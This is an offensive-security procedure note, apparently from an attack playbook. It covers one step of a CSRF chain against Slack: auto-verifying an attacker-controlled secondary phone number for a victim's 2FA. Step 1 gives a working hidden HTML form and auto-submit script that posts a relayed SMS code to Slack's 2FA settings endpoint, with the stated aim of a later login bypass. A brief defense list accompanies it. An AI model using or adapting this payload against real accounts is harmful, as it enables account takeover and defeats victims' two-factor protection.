---
id: proc-slack-verify-phone
tags:
  - verification
  - csrf
  - 2fa
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:29.556Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Auto-Verify-Secondary-Phone-Number

## Summary

This procedure automatically submits the relayed SMS code to verify the added secondary phone number in Slack's 2FA settings.

## Description

Using the scode variable from the callback, a second HTML form auto-submits a POST to /account/settings/2fa_sms with backup=1, confirmation_code=scode, and formatted_phone_number=+61 ████████. This confirms the addition, making the attacker's phone a valid 2FA receiver.

## Requirements

1. scode variable set from previous callback
2. Victim's session still active
3. Phone number formatted correctly (e.g., +61 for AU)

## Defense

Defensive measures and detection strategies:

- Require user confirmation for 2FA changes
- Time-bound verification codes to prevent relay
- Audit logs for rapid 2FA additions/verifications
- Block auto-form submissions via JS event monitoring

## Objectives

1. Validate the secondary phone with intercepted code
2. Activate it for 2FA use
3. Prepare for login bypass

## Instructions

### Step 1: Prepare Verification Form

**Context**: Embed in slackcsrf.html after the first form.

HTML:
<form id="verifyPhone" action="https://cs-sa.slack.com/account/settings/2fa_sms" method="POST">
<input type="hidden" name="backup" value="1">
<input type="hidden" name="confirmation_code" value="">
<input type="hidden" name="formatted_phone_number" value="+61 ████████">
</form>
<script>document.getElementById('verifyPhone').confirmation_code.value = scode; document.getElementById('verifyPhone').submit();</script>

> Submits with dynamic code.

### Step 2: Execute on Load

**Context**: Page load triggers after code relay.

No command; auto-executes.

> Success: Number verified.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[verification]]
- [[2fa]]
